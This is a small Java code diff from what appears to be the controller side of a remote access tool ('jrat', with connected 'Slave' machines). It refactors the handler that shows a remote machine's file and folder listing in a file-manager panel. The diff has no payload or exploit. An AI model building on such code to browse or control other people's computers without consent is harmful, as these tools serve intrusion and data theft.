@@ -4,6 +4,7 @@ import iconlib.FileIconUtils;
 import jrat.controller.Slave;
 import jrat.controller.io.FileObject;
 import jrat.controller.packets.incoming.IncomingPacket;
+import jrat.module.fs.ui.PanelFileManager;
 import jrat.module.fs.ui.PanelFileSystem;
 
 import java.util.ArrayList;
@@ -14,8 +15,8 @@ public class Packet22ListFiles implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
-		List<FileObject> files = new ArrayList<FileObject>();
-		List<FileObject> dirs = new ArrayList<FileObject>();
+		List<FileObject> files = new ArrayList<>();
+		List<FileObject> dirs = new ArrayList<>();
 
 		int len = slave.readInt();
 
@@ -42,16 +43,16 @@ public class Packet22ListFiles implements IncomingPacket {
 			}
 		}
 
-        PanelFileSystem frame = (PanelFileSystem) slave.getPanel(PanelFileSystem.class);
-		if (frame != null) {
-			frame.getFilesPanel().getRemoteTable().clear();
+        PanelFileManager panel = (PanelFileManager) slave.getPanel(PanelFileManager.class);
+		if (panel != null) {
+			panel.getRemoteTable().clear();
 
 			for (FileObject fo : dirs) {
-				frame.getFilesPanel().getRemoteTable().addFileObject(fo);
+                panel.getRemoteTable().addFileObject(fo);
 			}
 			
 			for (FileObject fo : files) {
-				frame.getFilesPanel().getRemoteTable().addFileObject(fo);
+                panel.getRemoteTable().addFileObject(fo);
 			}
 		}
 	}
